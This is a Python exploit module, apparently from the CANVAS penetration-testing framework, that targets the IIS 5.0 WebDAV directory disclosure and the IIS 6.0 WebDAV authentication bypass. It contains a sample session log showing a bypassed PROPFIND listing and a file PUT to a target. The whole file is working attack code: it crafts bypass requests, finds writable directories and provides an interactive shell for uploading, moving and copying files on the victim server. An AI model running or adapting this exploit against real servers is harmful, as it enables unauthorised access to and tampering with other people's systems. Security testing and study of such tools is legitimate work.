#! /usr/bin/env python

# Some useful webdav bugs ...
#
# Microsoft IIS 5.0 Indexed Directory Disclosure Vulnerability
# Microsoft IIS 6.0 WebDAV auth bypass

NOTES = """
Versus Windows 2003 SP2 IIS 6.0:

CANVAS# python ./exploits/iis_webdav/iis_webdav.py -t192.168.1.103 -O davshell:1
...
DAV> bypass
[+] IIS 6.0 bypass mode toggled to: False
DAV> propfind
remote path: /WebDAV/
HTTP/1.1 401 Unauthorized
Content-Length: 1656
Content-Type: text/html
Server: Microsoft-IIS/6.0
WWW-Authenticate: Basic realm="192.168.1.103"
Date: Mon, 01 Jun 2009 20:33:45 GMT


DAV> bypass
[+] IIS 6.0 bypass mode toggled to: True
DAV> propfind
remote path: /WebDAV/
[ Mon Jun  1 16:33:53 2009 ][C] (192.168.1.103/32) [+] Chunked recv ...
Got chunksize: 1ef5

Getting 7925 bytes
Got chunksize: 0

HTTP/1.1 207 Multi-Status
Date: Mon, 01 Jun 2009 20:33:53 GMT
Server: Microsoft-IIS/6.0
Content-Type: text/xml
Transfer-Encoding: chunked


       0 2009-05-29T20:11:55.856Z http://192.168.1.103/WebDAV/
       4 2009-06-01T13:26:48.465Z http://192.168.1.103/WebDAV/hi.txt
    1677 2009-06-01T18:57:52.418Z http://192.168.1.103/WebDAV/lol.txt
    1677 2009-06-01T19:07:53.184Z http://192.168.1.103/WebDAV/lol2.txt
    1677 2009-06-01T19:18:07.184Z http://192.168.1.103/WebDAV/lol3.txt
    1677 2009-06-01T20:30:04.418Z http://192.168.1.103/WebDAV/lol4.txt
       0 2009-05-29T20:20:40.856Z http://192.168.1.103/WebDAV/TEST/
       4 2009-05-29T20:43:30.793Z http://192.168.1.103/WebDAV/TEST/hi.html
       4 2009-06-01T13:20:16.012Z http://192.168.1.103/WebDAV/TEST/hi.txt
    1677 2009-06-01T19:36:57.418Z http://192.168.1.103/WebDAV/TEST/lol5.txt
       0 2009-05-29T21:07:16.137Z http://192.168.1.103/WebDAV/TEST/New%20Text%20Document.txt
DAV> put
local src: /etc/passwd
remote dst: /WebDAV/lol.5.txt
[+] Trying PUT to: /WebDAV%c0%af/lol.5.txt
[ Mon Jun  1 16:34:07 2009 ][C] (192.168.1.103/32) [+] Possible PUT success!
[ Mon Jun  1 16:34:07 2009 ][C] (192.168.1.103/32) HTTP/1.1 201 Created
Date: Mon, 01 Jun 2009 20:34:08 GMT
Server: Microsoft-IIS/6.0
Location: http://192.168.1.103/WebDAV/lol.5.txt
Content-Length: 0
Allow: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH,
LOCK, UNLOCK

[+] PUT succeeded ...
DAV>
"""

import sys
import os
if '.' not in sys.path:
    sys.path.append('.')
    
from xml.dom import minidom    
from tcpexploit import tcpexploit
from exploitutils import *

NAME                            = 'IIS 5.0 Webdav Indexed Directory Disclosure - IIS 6.0 Webdav Auth bypass'
VERSION                         = '1.0'
DESCRIPTION                     = NAME

DOCUMENTATION                   = {}
DOCUMENTATION['VENDOR']         = "Microsoft"
DOCUMENTATION['References']     = 'http://www.securityfocus.com/bid/1756/info'
DOCUMENTATION['Repeatability']  = 'Repeatable'
DOCUMENTATION['Note']           = 'Custom Message will change the text in the file this module attempts to HTTP PUT'

PROPERTY                        = {}
PROPERTY['TYPE']                = 'Exploit'
PROPERTY['SITE']                = 'Remote'
PROPERTY['ARCH']                = [ ['Windows'] ]
PROPERTY['VERSION']             = [ '2000', '2003' ]

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.host       = '127.0.0.1'
        self.port       = 80
        # for websend (inherits from tcpexploit)
        self.ssl        = False
        self.file       = None
        # populate -O checkdirs:/,/a/,/b/ ...
        self.puts       = '/'
        # davshell bypass mode
        self.davshell   = False
        self.bypass     = True
        self.clientMessage = 'test' # Allow the user to specify what goes in hi.txt
        self.fileName = 'hi.txt' # Make life easier for the customer
        return
    
    def getArgs(self):
        self.host       = self.target.interface
        self.port       = int(self.argsDict.get('port', self.port))
        self.ssl        = bool(int(self.argsDict.get('ssl', self.ssl)))
        self.davshell   = bool(int(self.argsDict.get('davshell', self.davshell)))
        self.file       = self.argsDict.get('file', self.file)
        self.puts       = self.argsDict.get('checkdirs', self.puts).split(',')
        self.clientMessage = self.argsDict.get("message",self.clientMessage)
        return

    def parseFilesFromXML(self, listing):
        # format: <a:href>http://localhost/account/setupintro.aspx</a:href>
        files = []
        if self.file:
            self.file = open(self.file, 'wb')
        try:
            dom = minidom.parseString(listing)
        except:
            self.log("Failed to parse XML")
            return files

        for node in dom.getElementsByTagName('a:href'):
            self.log(node.firstChild.data)
            files.append(node.firstChild.data)
            if self.file:
                self.file.write(node.firstChild.data + '\n')
        if self.file:
            self.file.close()
        return files
    
    # some basic properties
    def parsePropInfoFromXML(self, listing):
        paths       = []
        dates       = []
        sizes       = []
        try:
            dom         = minidom.parseString(listing)
        except:
            self.log("Failed to parse XML")
            return (paths, dates, sizes)
        # XXX ... needs proper parsing
        for node in dom.getElementsByTagName('a:href'):
            paths.append(node.firstChild.data)
        for node in dom.getElementsByTagName('a:creationdate'):
            dates.append(node.firstChild.data)
        for node in dom.getElementsByTagName('a:getcontentlength'):
            sizes.append(node.firstChild.data)
        return (paths, dates, sizes)        
    
    # tries to locate writeable directories
    def findWrites(self, files, host, port):
        dirs = []
        rite = []
        # parse out the directories
        if self.ssl == True:
            pp = 'https://%s' % host
        else:
            pp = 'http://%s' % host
        # XXX: do backwards slash search .. HAHAHAHAHAHAhahahaHAHHAhahaah .. ha
        for file in files:
            # try/except for index error?
            dir = file[len(pp):]
            i = len(dir)
            while i and dir[-1] != '/':
                dir = dir[0:-1]
                i -= 1
            if dir not in dirs:
                dirs.append(dir)  
        for dir in dirs:
            ret = self.tryPutRequest(host, port, dir + self.fileName)
            if ret[0] == True:
                rite.append(ret[1])                
        return rite
    
    # XXX: ugly, needs urllib status logic
    def parsePutResponse(self, s, dst):
        writeable = False  
        try:
            response = ''
            while response.find('\r\n\r\n') == -1:
                response += self.getByte(s)

            if response.find('HTTP/1.1 100 Continue') != -1:
                response = ''
                while response.find('\r\n\r\n') == -1:
                    response += self.getByte(s)
                    
                if response.find('HTTP/1.1 403 Forbidden') != -1:
                    self.log("%s - 403 Forbidden" % dst)
                    
                elif response.find('HTTP/1.1 404 Resource Not Found') != -1:
                    self.log("%s - 404 Resource Not Found" % dst)
                    
                else:
                    self.log("[+] Possible PUT success!")
                    self.log(response)
                    writeable = True
                    
            elif response.find('HTTP/1.1 403 Forbidden') != -1:
                self.log("%s - 403 Forbidden" % dst)

            elif response.find('405 Method Not Allowed') != -1:
                self.log("Method not allowed")
                
            elif response.find('HTTP/1.1 401 Unauthorized') != -1:
                self.log("%s - 401 Unauthorized" % dst)
                raise Exception, 'Need credentials'
            
            elif response.find('HTTP/1.1 404 Not Found') != -1:
                self.log("%s - 404 Not Found" % dst)
                
            elif response.find('HTTP/1.1 501 Not Implemented') != -1:
                self.log("%s - 501 Not Implemented" % dst)
                raise Exception, 'WebDAV PUT not supported'
            
            elif response.find('HTTP/1.1 201 Created') != -1:
                self.log("[+] Possible PUT success!")
                self.log(response)
                writeable = True
                
            elif response.find('HTTP/1.1 200 OK') != -1:
                self.log("[+] Possible PUT success!")
                self.log(response)
                writeable = True
                
            else:
                self.log("Wacky header ...")
                self.log("response: %s"%str(response) )
                
        except Exception, msg:
            self.log("Exception: %s" % msg)
            response = ''     
        return writeable
    
    def getSock(self, host, port):
        s = self.gettcpsock()
        s.connect((host, port))
        return s
        
    def tryPutRequest(self, host, port, dst, src=None):
        if src:
            body = open(src, "rb").read()
        else:
            body = self.clientMessage
        # fix bad inputs
        if not dst.count('/'):
            dst = '/' + dst
        check_regular = dst
        if dst.count('/') == 1:
            check_bypass = dst.replace('/', '/%c0%af/')
        else:
            check_bypass = '/' + dst[1:].replace('/', '%c0%af/')
        for dst in [check_regular, check_bypass]:
            try:
                s = self.getSock(host, port)
            except:
                self.log("[-] Could not connect")
                return (False, None)
            self.log("[+] Trying PUT to: %s" % dst)
            header  = ''
            header  += 'PUT %s HTTP/1.1\r\n' % dst
            header  += 'Host: %s\r\n' % host
            header  += 'Connection: TE\r\n'
            header  += 'TE: trailers\r\n'
            header  += 'Content-Length: %d\r\n'%(len(body))
            header  += '\r\n'
            request = header + body
            self.websend(s, request)
            writeable = self.parsePutResponse(s, dst)
            s.close()
            if self.ssl:
                self.sslsock = None
            if writeable == True:
                if dst == check_bypass:
                    self.log("[+] PUT success with IIS6.0 WebDAV auth bypass: %s" % dst)            
                break
        
        return (writeable, dst)
    
    # XXX: ugly needs urllib status logic
    def parsePropResponse(self, s, dst):
        propable = False    
        try:
            
            response = ''
            while response.find('\r\n\r\n') == -1:
                response += self.getByte(s)
                
            if response.find('HTTP/1.1 100 Continue') != -1:
                response = ''
                while response.find('\r\n\r\n') == -1:
                    response += self.getByte(s)
                    
                if response.find('HTTP/1.1 403 Forbidden') != -1:
                    self.log("%s - 403 Forbidden" % dst) 
                    
                elif response.find('HTTP/1.1 404 Resource Not Found') != -1:
                    self.log("%s - 404 Resource Not Found" % dst)
                    
                else:
                    self.log("[+] Possible PUT success!")
                    self.log(response)
                    propable = True

            elif response.find('HTTP/1.1 403 Forbidden') != -1:
                self.log("%s - 403 Forbidden" % dst)

            elif response.find('HTTP/1.1 401 Unauthorized') != -1:
                self.log("%s - 401 Unauthorized" % dst)
                raise Exception, 'Need credentials'

            elif response.find('HTTP/1.1 404 Not Found') != -1:
                self.log("%s - 404 Not Found" % dst)
            elif response.find('405 Method Not Allowed') != -1:
                self.log("405 Method Not Allowed")

            elif response.find('HTTP/1.1 501 Not Implemented') != -1:
                self.log("%s - 501 Not Implemented" % dst)
                raise Exception, 'WebDAV PROPFIND not supported'
            
            elif response.find('HTTP/1.1 207 Multi-Status') != -1:
                self.log("[+] Possible PROPFIND success!")
                self.log(response)
                propable = True
                # get the prop results
                chunksize   = 1
                xml         = ''
                if response.find('Transfer-Encoding: chunked') != -1:
                    self.log("[+] Chunked recv ...")
                    while chunksize:
                        chunksize = ''
                        # read size line
                        while '\n' not in list(chunksize):
                            chunksize += self.getByte(s)
                        self.log("Got chunksize: %s" % chunksize)
                        chunksize = int("0x%s" % chunksize, base=16)
                        if chunksize:
                            chunk   = ''
                            xml     = '' 
                            while chunksize:
                                self.log("Getting %d bytes" % chunksize)
                                chunk        = self.getBytes(s, chunksize)
                                chunksize   -= len(chunk)
                                xml         += chunk
                            # eat \r\n and go to next chunk size line
                            chunksize = ''
                            while '\n' not in list(chunksize):
                                chunksize += self.getByte(s)
                            chunksize = 1
                            
                # dump found properties
                paths, dates, sizes = self.parsePropInfoFromXML(xml)
                self.log('[+] PROPFIND results:')
                for path in paths:
                    self.log('%s' % path)
            else:
                self.log("Wacky header ...")
                print response
                
        except Exception, msg:
            self.log("Exception: %s" % msg)
            response = ''     
        return propable
    
    def tryPropRequest(self, host, port, dst):
        body = ''
        # fix bad inputs
        if not dst.count('/'):
            dst = '/' + dst
        check_regular = dst
        if dst.count('/') == 1:
            check_bypass = dst.replace('/', '/%c0%af/')
        else:
            check_bypass = '/' + dst[1:].replace('/', '%c0%af/')
        for dst in [check_regular, check_bypass]:
            try:
                s = self.getSock(host, port)
            except:
                self.log("[-] Could not connect")
                return (False, None)
            self.log("[+] Trying PROPFIND to: %s" % dst)
            header  = ''
            header  += 'PROPFIND %s HTTP/1.1\r\n' % dst
            header  += 'Host: %s\r\n' % host
            header  += 'Connection: TE\r\n'
            header  += 'Content-Length: %d\r\n'%(len(body))
            header  += '\r\n'
            request = header + body 
            self.websend(s, request)
            propable = self.parsePropResponse(s, dst)
            s.close()
            if self.ssl:
                self.sslsock = None
            if propable == True:
                if dst == check_bypass:
                    self.log("[+] PROPFIND success with IIS6.0 WebDAV auth bypass: %s" % dst)            
                break
        
        return (propable, dst)
    
    def getByte(self, s):
        byte = self.webrecv(s, size=1)
        if not len(byte):
            raise Exception, 'socket read timed out'
        else:
            return byte
    
    def getBytes(self, s, size):
        bytes = self.webrecv(s, size=size)
        if not len(bytes):
            raise Exception, 'socket read timed out'
        else:
            return bytes
        
    def parseSearchResponse(self, s):
        try:
            # get the full header
            response = ''
            while response.find('\r\n\r\n') == -1:
                response += self.getByte(s)
        except:
            self.log("Wacky header recv!")
            return None
        chunksize   = 1
        listing     = ''
        if response.find('Transfer-Encoding: chunked') != -1:
            self.log("[+] Chunked recv ...")
            while chunksize:
                chunksize = ''
                # read size line
                while '\n' not in list(chunksize):
                    chunksize += self.getByte(s)
                self.log("Got chunksize: %s" % chunksize)
                chunksize = int("0x%s" % chunksize, base=16)
                if chunksize:
                    chunk   = ''
                    listing = '' 
                    while chunksize:
                        self.log("Getting %d bytes" % chunksize)
                        chunk        = self.getBytes(s, chunksize)
                        chunksize   -= len(chunk)
                        listing     += chunk
                    # eat \r\n and go to next chunk size line
                    chunksize = ''
                    while '\n' not in list(chunksize):
                        chunksize += self.getByte(s)
                    chunksize = 1
        else:
            print response          
        return listing
                
    def trySearchRequest(self, host, port):
        try:
            s = self.getSock(host, port)
        except:
            self.log('[-] Could not connect')
            return None
        body    =  ''
        body    += '<?xml version="1.0"?>\n'
        body    += '<g:searchrequest xmlns:g="DAV:">\n'
        body    += '<g:sql>\n'
        body    += 'SELECT "DAV:displayname" from scope()\n'
        body    += '</g:sql>\n'
        body    += '</g:searchrequest>'        
        header  =''
        header  += 'SEARCH / HTTP/1.1\r\n'
        header  += 'Host: %s\r\n' % host
        header  += 'Content-Type: text/xml\r\n'
        header  += 'Content-Length: %d\r\n'%(len(body))
        header  += '\r\n'
        request = header + body    
        self.websend(s, request)
        listing = self.parseSearchResponse(s)  
        s.close()
        if self.ssl == True:
            self.sslsock = None         
        return listing
    
    def run(self):
        self.getArgs()
        if self.davshell == True:
            self.davShell()
        else:
            self.log("[+] Getting WebDav against %s:%d" % (self.host, self.port))
            listing = self.trySearchRequest(self.host, self.port)
            if listing and "error" not in listing:
                self.log("Parsing out files ...")
                files   = self.parseFilesFromXML(listing)
                dirs    = self.findWrites(files, self.host, self.port)
                for dir in dirs:
                    self.log("[+] Found writeable directory: %s" % dir)
                return True
            else:
                self.log("Failed to find directory listing ... trying defaults")
                # check with PROPFIND            
                for dir in self.puts:
                    if self.tryPropRequest(self.host, self.port, dir)[0] == True:
                        self.log("[+] Found PROPABLE directory: %s" % dir)
                # see if we can write to anything            
                for dir in self.puts:
                    if self.tryPutRequest(self.host, self.port, dir + self.fileName)[0] == True:
                        self.log("[+] Found writeable directory: %s" % dir)
        return False

    # basic little shell for quick put/move
    def getBypass(self, dst):
        check_regular = dst
        if dst.count('/') == 1:
            check_bypass = dst.replace('/', '/%c0%af/')
        else:
            check_bypass = '/' + dst[1:].replace('/', '%c0%af/')
        return check_regular, check_bypass
    def davResponse(self, s):
        try:
            response = ''
            while response.find('\r\n\r\n') == -1:
                response += self.getByte(s)
        except:
            print "Wacky header recv!"
            return None, None
        chunksize   = 1
        listing     = ''
        if response.find('Transfer-Encoding: chunked') != -1:
            self.log("[+] Chunked recv ...")
            while chunksize:
                chunksize = ''
                while '\n' not in list(chunksize):
                    chunksize += self.getByte(s)
                print "Got chunksize: %s" % chunksize
                chunksize = int("0x%s" % chunksize, base=16)
                if chunksize:
                    chunk   = ''
                    listing = '' 
                    while chunksize:
                        print "Getting %d bytes" % chunksize
                        chunk        = self.getBytes(s, chunksize)
                        chunksize   -= len(chunk)
                        listing     += chunk
                    chunksize = ''
                    while '\n' not in list(chunksize):
                        chunksize += self.getByte(s)
                    chunksize = 1        
        return (response, listing)
    def davMove(self, src, dst):
        try:
            s = self.getSock(self.host, self.port)
        except:
            return False
        src_regular, src_bypass = self.getBypass(src)
        dst_regular, dst_bypass = self.getBypass(dst)
        if self.bypass == True:
            dst = dst_bypass
            src = src_bypass
        body    = ''
        header  = ''
        header += 'MOVE %s HTTP/1.1\r\n' % src
        header += 'Host: %s\r\n' % self.host
        header += 'Destination: %s\r\n' % dst
        header += 'Overwrite: T\r\n'
        header += '\r\n'
        request = header + body
        self.websend(s, request)
        response, listing = self.davResponse(s)
        s.close()
        if self.ssl == True:
            self.sslsock = None         
        print response, listing
    def davCopy(self, src, dst):
        try:
            s = self.getSock(self.host, self.port)
        except:
            return False
        src_regular, src_bypass = self.getBypass(src)
        dst_regular, dst_bypass = self.getBypass(dst)
        if self.bypass == True:
            dst = dst_bypass
            src = src_bypass
        body    = ''
        header  = ''
        header += 'COPY %s HTTP/1.1\r\n' % src
        header += 'Host: %s\r\n' % self.host
        header += 'Destination: %s\r\n' % dst
        header += 'Overwrite: T\r\n'
        header += '\r\n'
        request = header + body    
        self.websend(s, request)
        response, listing = self.davResponse(s)
        s.close()
        if self.ssl == True:
            self.sslsock = None         
        print response, listing
    def davPropfind(self, path):
        try:
            s = self.getSock(self.host, self.port)
        except:
            return False
        path_regular, path_bypass = self.getBypass(path)
        if self.bypass == True:
            path = path_bypass
        body    = ''
        header  = ''
        header += 'PROPFIND %s HTTP/1.1\r\n' % path
        header += 'Host: %s\r\n' % self.host
        header += 'Content-Length: 0\r\n'
        header += '\r\n'
        request = header + body
        self.websend(s, request)
        response, listing = self.davResponse(s)
        s.close()
        if self.ssl == True:
            self.sslsock = None
        paths = ''
        dates = ''
        if listing:
            paths, dates, sizes = self.parsePropInfoFromXML(listing)
        i = 0
        print response
        while i < len(paths):
            try:
                print '%8s' % sizes[i] +' '+ dates[i] +' '+ paths[i]
            except IndexError:
                break
            i += 1
    def davPut(self, src, dst):
        try:
            body = open(src, "rb").read()
        except:
            print "[-] Could not open src file: %s" % src
            return
        check_regular, check_bypass = self.getBypass(dst)
        if self.bypass == True:
            dst = check_bypass
        try:
            s = self.getSock(self.host, self.port)
        except:
            self.log("[-] Could not connect")
            return
        print "[+] Trying PUT to: %s" % dst
        header  = ''
        header  += 'PUT %s HTTP/1.1\r\n' % dst
        header  += 'Host: %s\r\n' % self.host
        header  += 'Connection: TE\r\n'
        header  += 'TE: trailers\r\n'
        header  += 'Content-Length: %d\r\n'%(len(body))
        header  += '\r\n'
        request = header + body
        self.websend(s, request)
        writeable = self.parsePutResponse(s, dst)
        s.close()
        if self.ssl:
            self.sslsock = None
        if writeable == True:
            print "[+] PUT succeeded ..."
        return
    def davShellHelp(self):
        print "propfind - get properties for a path"
        print "put - put a file"
        print "move - move a file"
        print "copy - copy a file"
        print "bypass - toggle IIS6.0 auth bypass mode"
        print "exit - exit dav shell"
    def davShellBypass(self):
        if self.bypass == True:
            self.bypass = False
        else:
            self.bypass = True
        print "[+] IIS 6.0 bypass mode toggled to: " + repr(self.bypass)
    def davShellPropfind(self):
        try:
            path = raw_input('remote path: ')
        except EOFError:
            sys.stdout.write('\n')
            return
        self.davPropfind(path)
    def davShellMove(self):
        try:
            src = raw_input('remote src: ')
            dst = raw_input('remote dst: ')
        except EOFError:
            sys.stdout.write('\n')
            return
        self.davMove(src, dst)
    def davShellCopy(self):
        try:
            src = raw_input('remote src: ')
            dst = raw_input('remote dst: ')
        except EOFError:
            sys.stdout.write('\n')
            return
        self.davCopy(src, dst)
    def davShellPut(self):
        try:
            src = raw_input('local src: ')
            dst = raw_input('remote dst: ')
        except EOFError:
            sys.stdout.write('\n')
            return
        self.davPut(src, dst)
    def davShell(self):
        active = True
        while active == True:
            try:
                try:
                    line    = raw_input('DAV> ')
                    cmd     = line.split(' ')[0]
                    ret     = {
                        'help' : self.davShellHelp,
                        'propfind' : self.davShellPropfind,
                        'put' : self.davShellPut,
                        'move' : self.davShellMove,
                        'copy' : self.davShellCopy,
                        'bypass' : self.davShellBypass,
                        'exit' : lambda: os._exit(0)
                    }[cmd]()
                except KeyError:
                    self.davShellHelp()
            except EOFError:
                sys.stdout.write('\n')
                break 
            
    def usage(self):
        self.log("Usage: -t <host> [ -O checkdirs:<dirs> -O ssl:<0/1>] [-O davshell:1]")
        self.log("e.g. iis_webdav_idd.py -t 192.168.1.1 -O checkdirs:/,/tmp/ -O ssl:1")
        self.log("NOTE: davshell toggles an interactive shell that lets you PUT/MOVE files")
        return
    
if __name__=='__main__':
    print 'Running CANVAS %s Exploit v%s' % (DESCRIPTION, VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)
            
